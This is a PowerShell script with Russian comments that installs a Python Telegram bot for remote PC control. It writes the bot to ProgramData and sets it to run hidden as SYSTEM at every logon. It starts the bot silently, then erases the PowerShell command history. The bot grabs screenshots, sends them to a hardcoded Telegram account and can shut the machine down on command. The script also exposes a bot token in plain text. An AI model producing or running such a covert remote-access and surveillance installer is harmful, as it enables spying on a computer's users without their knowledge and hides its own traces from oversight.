# 1. Рабочая папка в системе
$botDir = "C:\ProgramData\TelegramPCBot"
if (-not (Test-Path $botDir)) { New-Item -ItemType Directory -Path $botDir -Force | Out-Null }

# 2. Код бота с вашим токеном и вашим личным ID
$botCode = @"
import os
import subprocess
import telebot
from PIL import ImageGrab

TOKEN = "9090353860:AAEKHH_hnMcN8Xux7JRI7tha0bPF-lHtTL4" 
ADMIN_ID = 1468733354

bot = telebot.TeleBot(TOKEN)

def check_access(message):
    return message.from_user.id == ADMIN_ID

@bot.message_handler(commands=['start', 'help'])
def send_welcome(message):
    if check_access(message):
        bot.reply_to(message, "🤖 Бот управления ПК активен.\n\nКоманды:\n/ping - Проверить статус\n/screen - Скриншот\n/shutdown - Выключить")

@bot.message_handler(commands=['ping'])
def send_status(message):
    if check_access(message):
        bot.reply_to(message, "🖥️ Система онлайн.")

@bot.message_handler(commands=['screen'])
def send_screenshot(message):
    if check_access(message):
        try:
            path = os.path.join("$botDir", "screen.png")
            screenshot = ImageGrab.grab()
            screenshot.save(path)
            with open(path, 'rb') as photo:
                bot.send_photo(message.chat.id, photo)
            os.remove(path)
        except Exception as e:
            bot.reply_to(message, f"Ошибка: {str(e)}")

@bot.message_handler(commands=['shutdown'])
def shutdown_system(message):
    if check_access(message):
        bot.reply_to(message, "⚠️ Компьютер выключается...")
        subprocess.run(["shutdown", "/s", "/t", "5"], shell=True)

if __name__ == '__main__':
    bot.infinity_polling()
"@

Set-Content -Path "$botDir\mysystem_bot.py" -Value $botCode -Encoding UTF8

# 3. Автоматическая установка библиотек на компьютер
pip install pyTelegramBotAPI Pillow screeninfo --quiet

# 4. Создание скрытой задачи в Планировщике Windows для автозапуска при старте ПК
$action = New-ScheduledTaskAction -Execute "pythonw.exe" -Argument "$botDir\mysystem_bot.py"
$trigger = New-ScheduledTaskTrigger -AtLogOn
$principal = New-ScheduledTaskPrincipal -UserId "NT AUTHORITY\SYSTEM" -RunLevel Highest
Register-ScheduledTask -TaskName "TelegramPCControlBot" -Action $action -Trigger $trigger -Principal $principal -Force | Out-Null

# 5. Незаметный запуск бота прямо сейчас
Start-Process "pythonw.exe" -ArgumentList "$botDir\mysystem_bot.py"

# 6. Очистка истории вбитых команд на этом компьютере
Clear-History
$historyPath = (Get-PSReadLineOption).HistorySavePath
if (Test-Path $historyPath) { Remove-Item $historyPath -Force -ErrorAction SilentlyContinue }
Clear-Host
